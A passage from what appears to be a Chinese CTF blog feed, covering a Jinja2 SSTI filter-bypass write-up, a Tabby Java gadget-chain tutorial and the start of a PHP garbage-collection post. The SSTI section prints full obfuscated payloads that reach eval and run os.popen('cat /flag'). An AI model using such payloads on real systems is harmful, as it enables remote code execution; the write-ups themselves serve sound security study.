class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-keyword">for</span> f,v <span class="hljs-keyword">in</span> whoami.__init__.__globals__.items() %&#125;    <span class="hljs-comment"># globals</span><br>    &#123;% <span class="hljs-keyword">if</span> f == bul %&#125; <br>        &#123;% <span class="hljs-keyword">for</span> a,b <span class="hljs-keyword">in</span> v.items() %&#125;    <span class="hljs-comment"># builtins</span><br>            &#123;% <span class="hljs-keyword">if</span> a == ev %&#125;    <span class="hljs-comment"># eval</span><br>                &#123;&#123;b(pld)&#125;&#125;    <span class="hljs-comment"># eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span><br>            &#123;% endif %&#125;<br>        &#123;% endfor %&#125;<br>    &#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>过滤.的版本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;<br>&#123;% <span class="hljs-keyword">for</span> f,v <span class="hljs-keyword">in</span> (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;<br>    &#123;% <span class="hljs-keyword">if</span> f == bul %&#125;<br>        &#123;% <span class="hljs-keyword">for</span> a,b <span class="hljs-keyword">in</span> (v|attr(itm))() %&#125;<br>            &#123;% <span class="hljs-keyword">if</span> a == ev %&#125;<br>            &#123;%<span class="hljs-built_in">print</span>(b(pld))%&#125;<br>            &#123;% endif %&#125;<br>        &#123;% endfor %&#125;<br>    &#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% <span class="hljs-built_in">set</span> zero = (self|<span class="hljs-built_in">int</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> one = (zero**zero)|<span class="hljs-built_in">int</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> two = (zero-one-one)|<span class="hljs-built_in">abs</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> four = (two*two)|<span class="hljs-built_in">int</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> five = (two*two*two)-one-one-one %&#125;<br>&#123;% <span class="hljs-built_in">set</span> three = five-one-one %&#125;<br>&#123;% <span class="hljs-built_in">set</span> nine = (two*two*two*two-five-one-one) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> seven = (zero-one-one-five)|<span class="hljs-built_in">abs</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> space = self|string|<span class="hljs-built_in">min</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> point = self|<span class="hljs-built_in">float</span>|string|<span class="hljs-built_in">min</span> %&#125;<br>&#123;% <span class="hljs-built_in">set</span> c = <span class="hljs-built_in">dict</span>(c=aa)|reverse|first %&#125;<br>&#123;% <span class="hljs-built_in">set</span> bfh = self|string|urlencode|first %&#125;<br>&#123;% <span class="hljs-built_in">set</span> bfhc = bfh~c %&#125;<br>&#123;% <span class="hljs-built_in">set</span> slas = bfhc%((four~seven)|<span class="hljs-built_in">int</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yin = bfhc%((three~nine)|<span class="hljs-built_in">int</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> xhx = bfhc%((nine~five)|<span class="hljs-built_in">int</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> right = bfhc%((four~one)|<span class="hljs-built_in">int</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> left = bfhc%((four~zero)|<span class="hljs-built_in">int</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> but = <span class="hljs-built_in">dict</span>(buil=aa,tins=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> imp = <span class="hljs-built_in">dict</span>(imp=aa,ort=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> pon = <span class="hljs-built_in">dict</span>(po=aa,pen=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> so = <span class="hljs-built_in">dict</span>(o=aa,s=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ca = <span class="hljs-built_in">dict</span>(ca=aa,t=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> flg = <span class="hljs-built_in">dict</span>(fl=aa,ag=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ev = <span class="hljs-built_in">dict</span>(ev=aa,al=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> red = <span class="hljs-built_in">dict</span>(re=aa,ad=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> sl = <span class="hljs-built_in">dict</span>(l=aa,s=dd)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> bul = xhx~xhx~but~xhx~xhx %&#125;<br>&#123;% <span class="hljs-built_in">set</span> ini = <span class="hljs-built_in">dict</span>(ini=aa,t=bb)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> glo = <span class="hljs-built_in">dict</span>(glo=aa,bals=bb)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> itm = <span class="hljs-built_in">dict</span>(ite=aa,ms=bb)|join %&#125;<br>&#123;% <span class="hljs-built_in">set</span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;<br>&#123;% <span class="hljs-keyword">for</span> f,v <span class="hljs-keyword">in</span> (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> f == bul %&#125;<br>&#123;% <span class="hljs-keyword">for</span> a,b <span class="hljs-keyword">in</span> (v|attr(itm))() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> a == ev %&#125;<br>&#123;%<span class="hljs-built_in">print</span>(b(pld))%&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssti </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabby安装配置及使用</title>
      <link href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Tabby安装配置及使用"><a href="#Tabby安装配置及使用" class="headerlink" title="Tabby安装配置及使用"></a>Tabby安装配置及使用</h1><h2 id="0x00安装"><a href="#0x00安装" class="headerlink" title="0x00安装"></a>0x00安装</h2><h3 id="Neo4j-Desktop"><a href="#Neo4j-Desktop" class="headerlink" title="Neo4j Desktop"></a>Neo4j Desktop</h3><p>官网直接下 <a href="https://neo4j.com/download/">Neo4j Desktop Download | Free Graph Database Download</a></p><p>下完打开初始化完可以看到数据库版本，下对应版本的APOC插件 </p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321216.png" alt="image-20230501151304382"></p><h3 id="新建Neo4j图数据库"><a href="#新建Neo4j图数据库" class="headerlink" title="新建Neo4j图数据库"></a>新建Neo4j图数据库</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321510.png" alt="image-20230501152338340"></p><p>可以选择更新数据库版本到5.4.0</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321584.png" alt="image-20230501162942114"></p><p>打开数据库旁的<code>···</code>-&gt;<code>Settings...</code>更改以下配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#允许从本地任意位置载入csv文件(大概在前面几行)</span><br><span class="hljs-comment">#server.directories.import=import</span><br><span class="hljs-comment">#允许 apoc扩展（大概在配置文件末尾部分）</span><br><span class="hljs-attr">dbms.security.procedures.unrestricted</span>=jwt.security.*,apoc.*<br><span class="hljs-comment"># 修改内存相关配置 </span><br><span class="hljs-comment"># 可以通过官方的neo4j-admin来推荐配置内存大小</span><br><span class="hljs-attr">dbms.memory.heap.initial_size</span>=<span class="hljs-number">1</span>G<br><span class="hljs-attr">dbms.memory.heap.max_size</span>=<span class="hljs-number">4</span>G<br><span class="hljs-attr">dbms.memory.pagecache.size</span>=<span class="hljs-number">4</span>G<br></code></pre></td></tr></table></figure><p>配置 apoc 的配置，需要找到配置文件目录，在这个目录下新建 apoc.conf 文件，内容为</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321995.png" alt="image-20230501161001178"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">apoc.import.file.enabled</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">apoc.import.file.use_neo4j_config</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>最后，配置一下 apoc 和 tabby 插件，打开 plugins 目录将对应的 jar 复制到与上面conf同目录下的plugins目录</p><p>tabby插件：<a href="https://github.com/wh1t3p1g/tabby/releases">Releases · wh1t3p1g&#x2F;tabby · GitHub</a> （在env目录里,同时把env里面几个apoc的jar包都<strong>复制</strong>到plugins里）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321885.png" alt="image-20230501163440727"></p><h3 id="验证配置"><a href="#验证配置" class="headerlink" title="验证配置"></a>验证配置</h3><p>重启数据库后，open-&gt;Neo4j Browser,测试查询语句，查看一下apoc（有30项）和tabby（有两项）的配置</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321101.png" alt="image-20230501163735244"></p><h3 id="简单启动"><a href="#简单启动" class="headerlink" title="简单启动"></a>简单启动</h3><p>在下载的tabby文件夹中新建一个case目录，下面放目标jar,同时修改config&#x2F;settings.properties</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321272.png" alt="image-20230501190832777"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321030.png" alt="image-20230501191148762"></p><p>使用jdk8启动tabby.jar，命令行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>可能出现的报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">java.lang.IllegalStateException: Failed to execute CommandLineRunner<br>at org.springframework.boot.SpringApplication.callRunner(SpringApplication.java:771) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.callRunners(SpringApplication.java:752) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1303) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1292) [spring-boot-2.7.7.jar!/:2.7.7]<br>at tabby.App.main(App.java:28) [classes!/:na]<br>at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_341]<br>at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_341]<br>at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_341]<br>....<br></code></pre></td></tr></table></figure><blockquote><p>把config&#x2F;settings.properties中的<code>tabby.cache.isDockerImportPath</code>设置为false，这个选项用于判断当前是否是docker环境,如果是本机直接使用，要设置成false</p></blockquote><h3 id="图数据库索引配置"><a href="#图数据库索引配置" class="headerlink" title="图数据库索引配置"></a>图数据库索引配置</h3><p>可以加快导入&#x2F;删除的速度，只要在Neo4j browser里运行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cql">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>#之后可以运行下面命令来查看表库和数据库信息<br>:schema <br>:sysinfo <br></code></pre></td></tr></table></figure><h2 id="0x01简单使用"><a href="#0x01简单使用" class="headerlink" title="0x01简单使用"></a>0x01简单使用</h2><h3 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h3><p>以找cc链为例，将tabby目录下的配置文件的tabby.build.target该成commons-collections jar所在位置</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322228.png" alt="image-20230504085113381"></p><p>shell运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><blockquote><p>注意要使用java8</p></blockquote><p>成功连接数据库</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322970.png" alt="image-20230504085210709"></p><h3 id="可能的报错"><a href="#可能的报错" class="headerlink" title="可能的报错"></a>可能的报错</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322071.png" alt="image-20230504085257308"></p><blockquote><p>原因：Neo4j数据库未开启，即使数据库未开启，刚开始的info仍显示有”default”数据库</p></blockquote><p>出现下图即表示导入完毕</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322896.png" alt="image-20230504085512803"></p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>打开Neo4j browser，用以下语句查询CC7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cql">match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;equals&quot;&#125;)-[:ALIAS*..2]-(m4:Method)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;)  return path<br></code></pre></td></tr></table></figure><blockquote><p>可以很明显的看到是从Hashtable的readObject为起点，hashtable反序列化时调用<strong>reconstitutionPut方法</strong>，在这个方法的执行流程中会调用equals判断key是否重复，如果调用的是AbstractMap的equals，之后会触发LazyMap的get，之后就是常规的触发transform</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322187.png" alt="image-20230504091827921"></p><blockquote><p>查询结果节点以id显示，点击后可以在右框查看属性</p></blockquote><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><ul><li><p>Neo4j中有三种指向：<code>() - [] -&gt; ()</code>、<code>() &lt;- [] - ()</code>和<code>() - [] - ()</code>。顾名思义，前两种就是看箭头方向表示对应的单项关系；最后一种表示双向关系</p></li><li><p>形如<code>[:CALL]</code>的可以认为给调用边起一个别名CALL</p></li><li><p>对于每个节点，SIGNATURE属性存储着完整的方法名称</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322332.png" alt="image-20230504091725958"></p></li><li><p>上述查询语句中equals方法后为<code>[:ALIAS*..2]</code></p><ul><li><code>*1..N</code>的意思即为：如果在1到N层关系中存在路径，将返回开始点和结束点，若缺省开头，则默认从1开始，所以<code>[:ALIAS*..2]</code>表示找两层以内的方法</li></ul></li><li><p>在Neo4j查询语句CQL中可以设定指定方向，如<code>-[:CALL ]-&gt;</code>,而<code>-[:ALIAS*1..2]-</code>没有指定方向，说明关系内的方法只能作为alias,可以理解为从当前节点向外广度延伸以搜索能调用到下一个方法节点的调用链</p></li><li><p>每个节点都有两个属性 IS_SINK IS_SOURCE ，分别代表是否是结尾节点和起始节点</p></li></ul><p>根据查询结果很容易发现调用链</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322538.png" alt="image-20230504123909760"></p><h2 id="0x02CTF中使用"><a href="#0x02CTF中使用" class="headerlink" title="0x02CTF中使用"></a>0x02CTF中使用</h2><p>上面找cc链的过程指向性比较强，在ctf中，可以利用该工具找到两个方法之间的调用链</p><h3 id="长城杯-2022-b4bycoffee"><a href="#长城杯-2022-b4bycoffee" class="headerlink" title="[长城杯 2022]b4bycoffee"></a>[长城杯 2022]b4bycoffee</h3><p>题目给出源码，反编译一下，coffeeBean的toString有个字节码后门</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322562.png" alt="image-20230504124900205"></p><p>反序列化入口，跟进一下AntObjectInputStream</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323091.png" alt="image-20230504125123715"></p><p>在反序列化时设置了黑名单类，过滤了这些</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException,ObjectBean,ToStringBean,TemplatesImpl,Runtime<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323797.png" alt="image-20230504125216104"></p><p>现在只要触发toString，但是常用的BadAttributeValueExpException被ban了，注意到依赖中存在rome，可以用EqualsBean的hashcode方法可以触发到任意类的toString方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323020.png" alt="image-20230504125407054"></p><p>但是这题也可以用tabby找一个readObject-&gt;toString的链子，写出以下查询语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cql">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)<br>match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)<br>with source, collect(sink) as sinks<br>call tabby.algo.findJavaGadget(source, sinks, 12, false,true) yield path where none(n in nodes(path) where n.CLASSNAME in [&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.sun.jmx.snmp.SnmpEngineId&quot;,&quot;com.sun.xml.internal.ws.api.BindingID&quot;,&quot;javax.swing.text.html.HTML$UnknownTag&quot;])<br>return path limit 1<br></code></pre></td></tr></table></figure><blockquote><p>设置起始节点为HashMap的readObject，结束节点为toString方法</p><p>之后排除了BadAttributeValueExpException等方法</p><p>tabby内的findJavaGadget接口会通过污点传播，根据java原生反序列化的规则来查找利用链，个参数分别表示起始节点、结束节点、路径的最大节点数、isBackward、depthFirst</p></blockquote><p>非常清晰的jdk原生利用链</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323655.png" alt="image-20230504130444449"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.ctfiot.com/64572.html">Java代码分析工具Tabby在CTF中的运用 | CTF导航 (ctfiot.com)</a></p><p><a href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/">Tabby 源码分析 | m0d9’s blog</a></p><p><a href="https://www.cnblogs.com/ljhdo/p/10929702.html">Neo4j 第九篇：查询数据（Match） - 悦光阴 - 博客园 (cnblogs.com)</a></p><p>[tabby&#x2F;Tabby 食用指北.md at master · wh1t3p1g&#x2F;tabby · GitHub](<a href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby">https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby</a> 食用指北.md)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP垃圾回收器与反序列化利用</title>
      <link href="/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
      <url>/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP垃圾回收器与反序列化利用"><a href="#PHP垃圾回收器与反序列化利用" class="headerlink" title="PHP垃圾回收器与反序列化利用"></a>PHP垃圾回收器与反序列化利用</h1><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>指php会自动释放程序不再需要的已分配的内存块。</p><h3 id="PHP5-3之前"><a href="#PHP5-3之前" class="headerlink" title="PHP5.3之前"></a>PHP5.3之前</h3><p>采用引用计数的方式，给每个内存对象分配一个计数器，每当内存对象被引用时，计数器+1，引用撤销后(unset())，计数器-1，对技术器&#x3D;0时，对内存对象进行销毁，垃圾回收机制完成，php一个生命周期后会释放此进程&#x2F;线程所占的内容</p><p>存在问题：两个或多个对象相互引用，使得计数器永远不为0，导致内存对象无法被回收</p><h3 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5.3"></a>PHP5.3</h3><p>加入复杂算法检测引用环的存在，避免内存泄露。</p><p>每个php变量存在一个叫zval的变量容器中，存储了变量的类型和值，还存储了“is_ref”bool型变量以标识该变量是否属于引用集合；还有一个“refcount”，用于表示指向这个zval变量容器的变量个数，注意，多个变量是可以共用一个变量容器的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span> );<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上代码会输出</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=3, <span class="hljs-attribute">is_ref</span>=0)=&#x27;new string<span class="hljs-string">&#x27; </span><br><span class="hljs-string">a: (refcount=1, is_ref=0)=&#x27;</span>new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="PHP7的NTS版本"><a href="#PHP7的NTS版本" class="headerlink" title="PHP7的NTS版本"></a>PHP7的NTS版本</h3><p>在该版本，上述通过赋值同一个变量的情况已经不会再被计数，PHP7中，zval可以被引用计数或不被引用</p><ul><li>对于null，bool，int和double的类型变量，refcount永远不会计数；</li><li>对于对象、资源类型，refcount计数和php5的一致；</li><li>对于字符串，未被引用的变量被称为“实际字符串”。而那些被引用的字符串也不计数</li><li>对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则（即如果是字符串也不在计数）；如果使用opcache，则代码中的常量数组文字将被转换为不可变数组。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试字符串引用计数&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试数组引用计数&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$c</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-variable">$c</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;c&#x27;</span> );<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试int型计数&#x27;</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;e&#x27;</span> 